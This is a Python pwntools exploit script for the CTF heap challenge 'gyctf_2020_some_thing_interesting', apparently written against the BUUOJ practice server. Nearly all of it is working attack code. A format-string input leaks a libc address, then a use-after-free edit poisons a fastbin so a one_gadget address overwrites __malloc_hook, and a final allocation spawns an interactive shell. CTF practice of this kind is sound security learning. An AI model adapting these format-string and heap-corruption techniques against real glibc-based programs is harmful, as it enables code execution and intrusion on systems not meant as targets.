# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
binary = './gyctf_2020_some_thing_interesting'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc-2.23.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28645'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(':',num)

def add(o_size,o_text,re_size,re_text):
    cmd(1)
    sla(":",o_size)
    sla(":",o_text)
    sla(":",re_size)
    sla(":",re_text)

def delete(id):
    cmd(3)
    sla(":",id)
    
def edit(id,o_text,re_text):
    cmd(2)
    sla(":",id)
    sla(":",o_text)
    sla(":",re_text)

def show(id):
    cmd(4)
    sla(":",id)

one_gad = [0x45216,0x4526a,0xf02a4,0xf1147]
key = 'OreOOrereOOreO' + "%17$p"
print(len(key))
sla(':',key)
cmd(0)
ru('OreOOrereOOreO')
__libc_start_main = rint(0x7f41a1eed830) - 240

libc.address = __libc_start_main - libc.sym["__libc_start_main"]
__malloc_hook = libc.sym["__malloc_hook"]
one_gadget = one_gad[3] + libc.address

fake = __malloc_hook - 0x23

add(0x60,"aaa",0x60,"bbbb") #1

delete(1)

edit(1 , p64(fake),p64(fake))

paylaod = "a"*0x13 + p64(one_gadget)
add(0x60,"niyah",0x60, paylaod) 

cmd(1)
sla(":",0x20)


p.interactive()

'''
@File    :   gyctf_2020_some_thing_interesting.py
@Time    :   2021/07/14 21:51:36
@Author  :   Niyah 
'''